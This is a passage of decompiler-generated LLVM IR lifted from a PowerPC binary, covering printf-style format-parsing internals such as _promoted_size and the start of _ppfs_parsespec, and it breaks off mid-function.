  %v2_10008fe0 = inttoptr i32 %v1_10008fe0 to i32*
  %v3_10008fe0 = load i32, i32* %v2_10008fe0, align 4
  store i32 %v3_10008fe0, i32* %r9.global-to-local, align 4
  %v1_10008fe4 = add i32 %v3_10008fe0, 4
  store i32 %v1_10008fe4, i32* %r0.global-to-local, align 4
  store i32 %v1_10008fe4, i32* %v2_10008fe0, align 4
  br label %dec_label_pc_10008fec

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fc8, %dec_label_pc_10008fe0
  %v0_10008fec = load i32, i32* %r9.global-to-local, align 4
  %v1_10008fec = inttoptr i32 %v0_10008fec to i32*
  %v2_10008fec = load i32, i32* %v1_10008fec, align 4
  store i32 %v2_10008fec, i32* %r0.global-to-local, align 4
  %v1_10008ff0 = load i32, i32* @r8, align 4
  %v2_10008ff0 = inttoptr i32 %v1_10008ff0 to i32*
  store i32 %v2_10008fec, i32* %v2_10008ff0, align 4
  %v0_10008ff4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ff4 = load i32, i32* @r3, align 4
  %v2_10008ff4 = add i32 %v1_10008ff4, 4
  %v3_10008ff4 = inttoptr i32 %v2_10008ff4 to i32*
  store i32 %v0_10008ff4, i32* %v3_10008ff4, align 4
  %v0_100091385.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009138.preheader

dec_label_pc_10009138.preheader:                  ; preds = %dec_label_pc_10008fa8, %dec_label_pc_10008fec
  %v0_100091385 = phi i32 [ %v2_10008fd8, %dec_label_pc_10008fa8 ], [ %v0_100091385.pre, %dec_label_pc_10008fec ]
  store i32 0, i32* @r7, align 4
  %v1_100091386 = add i32 %v0_100091385, 28
  %v2_100091387 = inttoptr i32 %v1_100091386 to i32*
  %v3_100091388 = load i32, i32* %v2_100091387, align 4
  store i32 %v3_100091388, i32* %r0.global-to-local, align 4
  %v2_1000913c9 = icmp sgt i32 %v3_100091388, 0
  %v3_1000913c10 = icmp slt i32 %v3_100091388, 0
  store i1 %v3_1000913c10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000913c9, label %dec_label_pc_10009000, label %dec_label_pc_10009188

dec_label_pc_10009000:                            ; preds = %dec_label_pc_10009138.preheader, %dec_label_pc_10009134
  %v2_10009114 = phi i32 [ %v0_10009138, %dec_label_pc_10009134 ], [ %v0_100091385, %dec_label_pc_10009138.preheader ]
  %v0_10009000 = phi i32 [ %v1_10009134, %dec_label_pc_10009134 ], [ 0, %dec_label_pc_10009138.preheader ]
  %v1_10009000 = mul i32 %v0_10009000, 4
  %v2_10009004 = add i32 %v1_10009000, %v2_10009114
  store i32 %v2_10009004, i32* %r9.global-to-local, align 4
  %v1_10009008 = add i32 %v2_10009004, 40
  %v2_10009008 = inttoptr i32 %v1_10009008 to i32*
  %v3_10009008 = load i32, i32* %v2_10009008, align 4
  store i32 %v3_10009008, i32* %r0.global-to-local, align 4
  %v2_1000900c = icmp sgt i32 %v3_10009008, 8
  %v3_1000900c = icmp eq i32 %v3_10009008, 8
  store i1 %v2_1000900c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000900c, label %dec_label_pc_10009134, label %dec_label_pc_10009014

dec_label_pc_10009014:                            ; preds = %dec_label_pc_10009000
  %v1_10009014 = add i32 %v2_10009114, 76
  store i32 %v1_10009014, i32* %r10.global-to-local, align 4
  br i1 %v2_1000900c, label %dec_label_pc_10009030, label %dec_label_pc_1000901c

dec_label_pc_1000901c:                            ; preds = %dec_label_pc_10009014
  %v2_1000901c = icmp sgt i32 %v3_10009008, 2
  store i1 %v2_1000901c, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_10009008, 3
  br i1 %tmp23, label %dec_label_pc_100090f8, label %dec_label_pc_10009048

dec_label_pc_10009030:                            ; preds = %dec_label_pc_10009014
  %v2_10009030 = icmp sgt i32 %v3_10009008, 1024
  store i1 %v2_10009030, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_10009008, 1025
  br i1 %tmp24, label %dec_label_pc_100090f8, label %dec_label_pc_1000903c

dec_label_pc_1000903c:                            ; preds = %dec_label_pc_10009030
  %v2_1000903c = icmp sgt i32 %v3_10009008, 2048
  %v3_1000903c = icmp eq i32 %v3_10009008, 2048
  store i1 %v2_1000903c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000903c, label %dec_label_pc_10009050, label %dec_label_pc_10009044

dec_label_pc_10009044:                            ; preds = %dec_label_pc_1000903c
  %v2_10009044 = icmp sgt i32 %v3_10009008, 2055
  %v3_10009044 = icmp eq i32 %v3_10009008, 2055
  store i1 %v2_10009044, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10009044, label %dec_label_pc_100090ac, label %dec_label_pc_100090f8

dec_label_pc_10009048:                            ; preds = %dec_label_pc_1000901c
  %v3_10009028 = icmp eq i32 %v3_10009008, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10009028, label %dec_label_pc_100090ac, label %dec_label_pc_100090f8

dec_label_pc_10009050:                            ; preds = %dec_label_pc_1000903c
  %v2_10009050 = inttoptr i32 %v1_10009014 to i8*
  %v3_10009050 = load i8, i8* %v2_10009050, align 1
  %v4_10009050 = zext i8 %v3_10009050 to i32
  %v2_10009054 = icmp ugt i8 %v3_10009050, 6
  store i1 %v2_10009054, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10009050, 2
  %v1_10009058 = zext i8 %tmp28 to i32
  store i32 %v1_10009058, i32* %r9.global-to-local, align 4
  %v2_1000905c = add nuw nsw i32 %v1_10009058, %v4_10009050
  store i32 %v2_1000905c, i32* %r0.global-to-local, align 4
  %v1_10009060 = trunc i32 %v2_1000905c to i8
  store i8 %v1_10009060, i8* %v2_10009050, align 1
  %v0_10009064 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10009064, label %dec_label_pc_10009084, label %dec_label_pc_10009068

dec_label_pc_10009068:                            ; preds = %dec_label_pc_10009050
  %v0_10009068 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009068 = urem i32 %v0_10009068, 256
  store i32 %v1_10009068, i32* %r9.global-to-local, align 4
  %v0_1000906c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000906c = add i32 %v0_1000906c, 8
  %v2_1000906c = inttoptr i32 %v1_1000906c to i32*
  %v3_1000906c = load i32, i32* %v2_1000906c, align 4
  %v1_10009070 = mul nuw nsw i32 %v1_10009068, 4
  store i32 %v1_10009070, i32* %r0.global-to-local, align 4
  %v1_10009074 = add nuw nsw i32 %v1_10009068, 2
  store i32 %v1_10009074, i32* %r9.global-to-local, align 4
  %v2_10009078 = add i32 %v3_1000906c, %v1_10009070
  store i32 %v2_10009078, i32* %r11.global-to-local, align 4
  %v1_1000907c = trunc i32 %v1_10009074 to i8
  %v2_1000907c = load i32, i32* @r3, align 4
  %v3_1000907c = add i32 %v2_1000907c, 76
  %v4_1000907c = inttoptr i32 %v3_1000907c to i8*
  store i8 %v1_1000907c, i8* %v4_1000907c, align 1
  br label %dec_label_pc_10009098

dec_label_pc_10009084:                            ; preds = %dec_label_pc_10009050
  %v0_10009084 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009084 = add i32 %v0_10009084, 4
  %v2_10009084 = inttoptr i32 %v1_10009084 to i32*
  %v3_10009084 = load i32, i32* %v2_10009084, align 4
  %v1_10009088 = add i32 %v3_10009084, 7
  store i32 %v1_10009088, i32* %r9.global-to-local, align 4
  %v1_1000908c = call i32 @__asm_rlwinm(i32 %v1_10009088, i32 0, i32 0, i32 28)
  store i32 %v1_1000908c, i32* %r11.global-to-local, align 4
  %v1_10009090 = add i32 %v1_1000908c, 8
  store i32 %v1_10009090, i32* %r0.global-to-local, align 4
  %v1_10009094 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009094 = add i32 %v1_10009094, 4
  %v3_10009094 = inttoptr i32 %v2_10009094 to i32*
  store i32 %v1_10009090, i32* %v3_10009094, align 4
  br label %dec_label_pc_10009098

dec_label_pc_10009098:                            ; preds = %dec_label_pc_10009068, %dec_label_pc_10009084
  %v0_10009098 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009098 = inttoptr i32 %v0_10009098 to i32*
  %v2_10009098 = load i32, i32* %v1_10009098, align 4
  store i32 %v2_10009098, i32* %r9.global-to-local, align 4
  %v1_1000909c = add i32 %v0_10009098, 4
  %v2_1000909c = inttoptr i32 %v1_1000909c to i32*
  %v3_1000909c = load i32, i32* %v2_1000909c, align 4
  store i32 %v3_1000909c, i32* %r10.global-to-local, align 4
  %v1_100090a0 = load i32, i32* @r8, align 4
  %v2_100090a0 = inttoptr i32 %v1_100090a0 to i32*
  store i32 %v2_10009098, i32* %v2_100090a0, align 4
  %v0_100090a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100090a4 = load i32, i32* @r8, align 4
  %v2_100090a4 = add i32 %v1_100090a4, 4
  %v3_100090a4 = inttoptr i32 %v2_100090a4 to i32*
  store i32 %v0_100090a4, i32* %v3_100090a4, align 4
  br label %dec_label_pc_10009130

dec_label_pc_100090ac:                            ; preds = %dec_label_pc_10009044, %dec_label_pc_10009048
  store i32 %v1_10009014, i32* %r10.global-to-local, align 4
  %v1_100090b0 = add i32 %v2_10009114, 77
  %v2_100090b0 = inttoptr i32 %v1_100090b0 to i8*
  %v3_100090b0 = load i8, i8* %v2_100090b0, align 1
  %v4_100090b0 = zext i8 %v3_100090b0 to i32
  store i32 %v4_100090b0, i32* %r11.global-to-local, align 4
  %v2_100090b4 = icmp ugt i8 %v3_100090b0, 8
  store i1 %v2_100090b4, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_100090b0, 7
  br i1 %tmp25, label %dec_label_pc_100090d8, label %dec_label_pc_100090bc

dec_label_pc_100090bc:                            ; preds = %dec_label_pc_100090ac
  %v1_100090bc = add i32 %v2_10009114, 84
  %v2_100090bc = inttoptr i32 %v1_100090bc to i32*
  %v3_100090bc = load i32, i32* %v2_100090bc, align 4
  %v1_100090c0 = mul nuw nsw i32 %v4_100090b0, 8
  %v1_100090c4 = add nuw nsw i32 %v1_100090c0, 32
  %v2_100090c8 = add i32 %v1_100090c4, %v3_100090bc
  store i32 %v2_100090c8, i32* %r9.global-to-local, align 4
  %v1_100090cc = add nuw nsw i32 %v4_100090b0, 1
  store i32 %v1_100090cc, i32* %r0.global-to-local, align 4
  %v1_100090d0 = trunc i32 %v1_100090cc to i8
  store i8 %v1_100090d0, i8* %v2_100090b0, align 1
  br label %dec_label_pc_10009130

dec_label_pc_100090d8:                            ; preds = %dec_label_pc_100090ac
  %v1_100090d8 = add i32 %v2_10009114, 80
  %v2_100090d8 = inttoptr i32 %v1_100090d8 to i32*
  %v3_100090d8 = load i32, i32* %v2_100090d8, align 4
  %v1_100090dc = add i32 %v3_100090d8, 7
  store i32 %v1_100090dc, i32* %r9.global-to-local, align 4
  %v1_100090e0 = call i32 @__asm_rlwinm(i32 %v1_100090dc, i32 0, i32 0, i32 28)
  store i32 %v1_100090e0, i32* %r9.global-to-local, align 4
  %v1_100090e4 = add i32 %v1_100090e0, 8
  store i32 %v1_100090e4, i32* %r0.global-to-local, align 4
  %v1_100090e8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100090e8 = add i32 %v1_100090e8, 4
  %v3_100090e8 = inttoptr i32 %v2_100090e8 to i32*
  store i32 %v1_100090e4, i32* %v3_100090e8, align 4
  br label %dec_label_pc_10009130

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_10009044, %dec_label_pc_10009048, %dec_label_pc_10009030, %dec_label_pc_1000901c
  %v2_100090f8 = inttoptr i32 %v1_10009014 to i8*
  %v3_100090f8 = load i8, i8* %v2_100090f8, align 1
  %v4_100090f8 = zext i8 %v3_100090f8 to i32
  store i32 %v4_100090f8, i32* %r11.global-to-local, align 4
  %v2_100090fc = icmp ugt i8 %v3_100090f8, 8
  store i1 %v2_100090fc, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_100090f8, 7
  br i1 %tmp26, label %dec_label_pc_1000911c, label %dec_label_pc_10009104

dec_label_pc_10009104:                            ; preds = %dec_label_pc_100090f8
  %v1_10009104 = add i32 %v2_10009114, 84
  %v2_10009104 = inttoptr i32 %v1_10009104 to i32*
  %v3_10009104 = load i32, i32* %v2_10009104, align 4
  %v1_10009108 = mul nuw nsw i32 %v4_100090f8, 4
  %v2_1000910c = add i32 %v3_10009104, %v1_10009108
  store i32 %v2_1000910c, i32* %r9.global-to-local, align 4
  %v1_10009110 = add nuw nsw i32 %v4_100090f8, 1
  store i32 %v1_10009110, i32* %r0.global-to-local, align 4
  %v1_10009114 = trunc i32 %v1_10009110 to i8
  store i8 %v1_10009114, i8* %v2_100090f8, align 1
  br label %dec_label_pc_10009128

dec_label_pc_1000911c:                            ; preds = %dec_label_pc_100090f8
  %v1_1000911c = add i32 %v2_10009114, 80
  %v2_1000911c = inttoptr i32 %v1_1000911c to i32*
  %v3_1000911c = load i32, i32* %v2_1000911c, align 4
  store i32 %v3_1000911c, i32* %r9.global-to-local, align 4
  %v1_10009120 = add i32 %v3_1000911c, 4
  store i32 %v1_10009120, i32* %r0.global-to-local, align 4
  store i32 %v1_10009120, i32* %v2_1000911c, align 4
  br label %dec_label_pc_10009128

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009104, %dec_label_pc_1000911c
  %v0_10009128 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009128 = inttoptr i32 %v0_10009128 to i32*
  %v2_10009128 = load i32, i32* %v1_10009128, align 4
  store i32 %v2_10009128, i32* %r0.global-to-local, align 4
  %v1_1000912c = load i32, i32* @r8, align 4
  %v2_1000912c = inttoptr i32 %v1_1000912c to i32*
  store i32 %v2_10009128, i32* %v2_1000912c, align 4
  br label %dec_label_pc_10009130

dec_label_pc_10009130:                            ; preds = %dec_label_pc_100090d8, %dec_label_pc_100090bc, %dec_label_pc_10009098, %dec_label_pc_10009128
  %v0_10009130 = load i32, i32* @r8, align 4
  %v1_10009130 = add i32 %v0_10009130, 8
  store i32 %v1_10009130, i32* @r8, align 4
  %v0_10009134.pre = load i32, i32* @r7, align 4
  %v0_10009138.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009134

dec_label_pc_10009134:                            ; preds = %dec_label_pc_10009000, %dec_label_pc_10009130
  %v0_10009138 = phi i32 [ %v2_10009114, %dec_label_pc_10009000 ], [ %v0_10009138.pre, %dec_label_pc_10009130 ]
  %v0_10009134 = phi i32 [ %v0_10009000, %dec_label_pc_10009000 ], [ %v0_10009134.pre, %dec_label_pc_10009130 ]
  %v1_10009134 = add i32 %v0_10009134, 1
  store i32 %v1_10009134, i32* @r7, align 4
  %v1_10009138 = add i32 %v0_10009138, 28
  %v2_10009138 = inttoptr i32 %v1_10009138 to i32*
  %v3_10009138 = load i32, i32* %v2_10009138, align 4
  store i32 %v3_10009138, i32* %r0.global-to-local, align 4
  %v2_1000913c = icmp slt i32 %v1_10009134, %v3_10009138
  %v3_1000913c = icmp sgt i32 %v1_10009134, %v3_10009138
  store i1 %v3_1000913c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000913c, label %dec_label_pc_10009000, label %dec_label_pc_10009188

dec_label_pc_10009148:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000914c = icmp ne i32 %v3_10008f50, -2147483648
  %v4_1000914c = icmp eq i32 %v3_10008f50, -2147483648
  store i1 %v3_1000914c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000914c, label %dec_label_pc_10009154, label %dec_label_pc_10009168

dec_label_pc_10009154:                            ; preds = %dec_label_pc_10009148
  %v1_10009154 = add i32 %v0_10008f48, 36
  %v2_10009154 = inttoptr i32 %v1_10009154 to i8*
  %v3_10009154 = load i8, i8* %v2_10009154, align 1
  %v4_10009154 = zext i8 %v3_10009154 to i32
  %v1_10009158 = mul nuw nsw i32 %v4_10009154, 8
  %v2_1000915c = add i32 %v1_10009158, %v1_10008f4c
  store i32 %v2_1000915c, i32* %r9.global-to-local, align 4
  %v1_10009160 = add i32 %v2_1000915c, -8
  %v2_10009160 = inttoptr i32 %v1_10009160 to i32*
  %v3_10009160 = load i32, i32* %v2_10009160, align 4
  store i32 %v3_10009160, i32* %r0.global-to-local, align 4
  store i32 %v3_10009160, i32* %v2_10008f50, align 4
  %v0_10009168.pre = load i32, i32* @r3, align 4
  %v1_1000916c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009168

dec_label_pc_10009168:                            ; preds = %dec_label_pc_10009148, %dec_label_pc_10009154
  %v1_1000916c = phi i32 [ -2147483648, %dec_label_pc_10009148 ], [ %v1_1000916c.pre, %dec_label_pc_10009154 ]
  %v1_10009184 = phi i32 [ %v0_10008f48, %dec_label_pc_10009148 ], [ %v0_10009168.pre, %dec_label_pc_10009154 ]
  %v1_10009168 = add i32 %v1_10009184, 4
  %v2_10009168 = inttoptr i32 %v1_10009168 to i32*
  %v3_10009168 = load i32, i32* %v2_10009168, align 4
  store i32 %v3_10009168, i32* %r0.global-to-local, align 4
  %v3_1000916c = icmp sgt i32 %v3_10009168, %v1_1000916c
  %v4_1000916c = icmp eq i32 %v3_10009168, %v1_1000916c
  store i1 %v3_1000916c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000916c, label %dec_label_pc_10009174, label %dec_label_pc_10009188

dec_label_pc_10009174:                            ; preds = %dec_label_pc_10009168
  %v1_10009174 = add i32 %v1_10009184, 37
  %v2_10009174 = inttoptr i32 %v1_10009174 to i8*
  %v3_10009174 = load i8, i8* %v2_10009174, align 1
  %v4_10009174 = zext i8 %v3_10009174 to i32
  %v1_10009178 = mul nuw nsw i32 %v4_10009174, 8
  %v1_1000917c = load i32, i32* @r8, align 4
  %v2_1000917c = add i32 %v1_10009178, %v1_1000917c
  store i32 %v2_1000917c, i32* %r9.global-to-local, align 4
  %v1_10009180 = add i32 %v2_1000917c, -8
  %v2_10009180 = inttoptr i32 %v1_10009180 to i32*
  %v3_10009180 = load i32, i32* %v2_10009180, align 4
  store i32 %v3_10009180, i32* %r0.global-to-local, align 4
  store i32 %v3_10009180, i32* %v2_10009168, align 4
  %v0_10009188.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009188

dec_label_pc_10009188:                            ; preds = %dec_label_pc_10009134, %dec_label_pc_10009138.preheader, %dec_label_pc_10009168, %dec_label_pc_10009174
  %v0_10009188 = phi i32 [ %v1_10009184, %dec_label_pc_10009168 ], [ %v0_10009188.pre, %dec_label_pc_10009174 ], [ %v0_100091385, %dec_label_pc_10009138.preheader ], [ %v0_10009138, %dec_label_pc_10009134 ]
  %v1_10009188 = add i32 %v0_10009188, 8
  %v2_10009188 = inttoptr i32 %v1_10009188 to i32*
  %v3_10009188 = load i32, i32* %v2_10009188, align 4
  store i32 %v3_10009188, i32* %r11.global-to-local, align 4
  %v2_1000918c = icmp sgt i32 %v3_10009188, 0
  store i1 %v2_1000918c, i1* %cr7_gt.global-to-local, align 1
  %v0_10009190 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_10009188, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10009190)
  %v0_10009194 = load i32, i32* @r3, align 4
  %v1_10009194 = add i32 %v0_10009194, 16
  %v2_10009194 = inttoptr i32 %v1_10009194 to i32*
  %v3_10009194 = load i32, i32* %v2_10009194, align 4
  store i32 %v3_10009194, i32* %r0.global-to-local, align 4
  %v0_10009198 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009198 = sub i32 0, %v0_10009198
  store i32 %v1_10009198, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_100091a0 = add i32 %v0_10009194, 8
  %v3_100091a0 = inttoptr i32 %v2_100091a0 to i32*
  store i32 %v1_10009198, i32* %v3_100091a0, align 4
  %v0_100091a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100091a4 = or i32 %v0_100091a4, 8
  store i32 %v1_100091a4, i32* %r0.global-to-local, align 4
  %v0_100091a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100091a8 = load i32, i32* @r3, align 4
  %v2_100091a8 = add i32 %v1_100091a8, 20
  %v3_100091a8 = inttoptr i32 %v2_100091a8 to i32*
  store i32 %v0_100091a8, i32* %v3_100091a8, align 4
  %v1_100091ac = call i32 @__asm_rlwinm(i32 %v1_100091a4, i32 0, i32 0, i32 30)
  store i32 %v1_100091ac, i32* %r0.global-to-local, align 4
  %v1_100091b0 = load i32, i32* @r3, align 4
  %v2_100091b0 = add i32 %v1_100091b0, 16
  %v3_100091b0 = inttoptr i32 %v2_100091b0 to i32*
  store i32 %v1_100091ac, i32* %v3_100091b0, align 4
  %v0_100091b4 = load i32, i32* @r3, align 4
  ret i32 %v0_100091b4

; uselistorder directives
  uselistorder i32 %v3_10009168, { 1, 0, 2 }
  uselistorder i32 %v1_1000916c, { 1, 0 }
  uselistorder i32 %v3_10009138, { 1, 0, 2 }
  uselistorder i32 %v1_10009134, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10009138, { 0, 2, 1 }
  uselistorder i32 %v4_100090b0, { 1, 0, 2 }
  uselistorder i32 %v1_10009070, { 1, 0 }
  uselistorder i32 %v1_10009068, { 2, 0, 1 }
  uselistorder i32 %v1_10009014, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10009008, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10009000, { 1, 0 }
  uselistorder i32 %v2_10009114, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100091385, { 1, 0, 2 }
  uselistorder i32 %v3_10008fa8, { 1, 0, 2 }
  uselistorder i32 %v2_10008fd8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10008f50, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10008f48, { 1, 0, 2 }
  uselistorder i32 %v0_10008f48, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 19, 18, 8, 9, 10, 11, 0, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_10009188, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10009168, { 1, 0 }
  uselistorder label %dec_label_pc_10009134, { 1, 0 }
  uselistorder label %dec_label_pc_10009130, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009128, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100090ac, { 1, 0 }
  uselistorder label %dec_label_pc_10009098, { 1, 0 }
  uselistorder label %dec_label_pc_10009000, { 1, 0 }
  uselistorder label %dec_label_pc_10009138.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008fec, { 1, 0 }
  uselistorder label %dec_label_pc_10008fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10008f9c, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_100091c4

dec_label_pc_100091c4:                            ; preds = %dec_label_pc_100091c4, %entry
  %v0_100091c4 = phi i32 [ ptrtoint (i32* @global_var_100129bc.582 to i32), %entry ], [ %v1_100091c4, %dec_label_pc_100091c4 ]
  %v1_100091c4 = add i32 %v0_100091c4, -2
  %v2_100091c4 = inttoptr i32 %v1_100091c4 to i16*
  %v3_100091c4 = load i16, i16* %v2_100091c4, align 2
  %v4_100091c4 = sext i16 %v3_100091c4 to i32
  %v4_100091c8 = icmp eq i32 %v4_100091c4, %arg1
  %v3_100091cc.not = icmp ule i32 %v1_100091c4, ptrtoint (i32* @global_var_100129a4.583 to i32)
  %brmerge = or i1 %v4_100091c8, %v3_100091cc.not
  br i1 %brmerge, label %dec_label_pc_100091d8, label %dec_label_pc_100091c4

dec_label_pc_100091d8:                            ; preds = %dec_label_pc_100091c4
  %v2_100091e0 = sub i32 %v1_100091c4, ptrtoint (i32* @global_var_100129a4.583 to i32)
  %v1_100091e8 = udiv i32 %v2_100091e0, 2
  %v2_100091e8 = and i32 %v2_100091e0, -2147483648
  %v3_100091e8 = or i32 %v1_100091e8, %v2_100091e8
  %v2_100091f0 = add i32 %v3_100091e8, ptrtoint (i32* @global_var_100129bc.582 to i32)
  %v3_100091f0 = inttoptr i32 %v2_100091f0 to i8*
  %v4_100091f0 = load i8, i8* %v3_100091f0, align 1
  %v5_100091f0 = zext i8 %v4_100091f0 to i32
  ret i32 %v5_100091f0

; uselistorder directives
  uselistorder i32 %v2_100091e0, { 1, 0 }
  uselistorder i32 %v1_100091c4, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_100129a4.583 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100129bc.582 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100091f8 = load i32, i32* @lr, align 4
  store i32 %v0_100091f8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_10009210 = add i32 %tmp, 16
  %v2_10009210 = inttoptr i32 %v1_10009210 to i32*
  %v3_10009210 = load i32, i32* %v2_10009210, align 4
  %v1_10009218 = and i32 %v3_10009210, 128
  store i32 %v1_10009218, i32* %r6.global-to-local, align 4
  %v3_10009218 = icmp eq i32 %v1_10009218, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000922c = add i32 %tmp, 24
  %v2_1000922c = inttoptr i32 %v1_1000922c to i32*
  %v3_1000922c = load i32, i32* %v2_1000922c, align 4
  store i32 %v3_1000922c, i32* @r26, align 4
  br i1 %v3_10009218, label %dec_label_pc_10009234, label %dec_label_pc_1000924c

dec_label_pc_10009234:                            ; preds = %entry
  %v2_10009234 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_100092a0

dec_label_pc_10009244:                            ; preds = %dec_label_pc_10009474
  %v1_10009244 = add i32 %v0_10009444, 1
  store i32 %v1_10009244, i32* @r30, align 4
  br label %dec_label_pc_1000948c

dec_label_pc_1000924c:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10009250 = load i32, i32* %arg1, align 4
  store i32 %v2_10009250, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000925c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000925c, i32* @r7, align 4
  br label %dec_label_pc_10009260

dec_label_pc_10009260:                            ; preds = %dec_label_pc_10009290.dec_label_pc_10009260_crit_edge, %dec_label_pc_1000924c
  %v0_10009268 = phi i32 [ %v0_10009268.pre, %dec_label_pc_10009290.dec_label_pc_10009260_crit_edge ], [ %v2_10009250, %dec_label_pc_1000924c ]
  %v0_10009264 = phi i32 [ %v0_10009264.pre, %dec_label_pc_10009290.dec_label_pc_10009260_crit_edge ], [ %v2_1000925c, %dec_label_pc_1000924c ]
  %v0_1000926c = phi i32 [ %v0_10009260.pre, %dec_label_pc_10009290.dec_label_pc_10009260_crit_edge ], [ 0, %dec_label_pc_1000924c ]
  %v1_10009260 = mul i32 %v0_1000926c, 4
  %v2_10009264 = add i32 %v0_1000926c, %v0_10009264
  store i32 %v2_10009264, i32* %r9.global-to-local, align 4
  %v2_10009268 = add i32 %v1_10009260, %v0_10009268
  store i32 %v2_10009268, i32* %r11.global-to-local, align 4
  %v1_1000926c = add i32 %v0_1000926c, 1
  store i32 %v1_1000926c, i32* %r10.global-to-local, align 4
  %v1_10009270 = add i32 %v2_10009268, -4
  %v2_10009270 = inttoptr i32 %v1_10009270 to i32*
  %v3_10009270 = load i32, i32* %v2_10009270, align 4
  store i32 %v3_10009270, i32* %r0.global-to-local, align 4
  %v1_10009274 = trunc i32 %v3_10009270 to i8
  %v3_10009274 = add i32 %v2_10009264, 24
  %v4_10009274 = inttoptr i32 %v3_10009274 to i8*
  store i8 %v1_10009274, i8* %v4_10009274, align 1
  %v0_10009278 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009278 = urem i32 %v0_10009278, 256
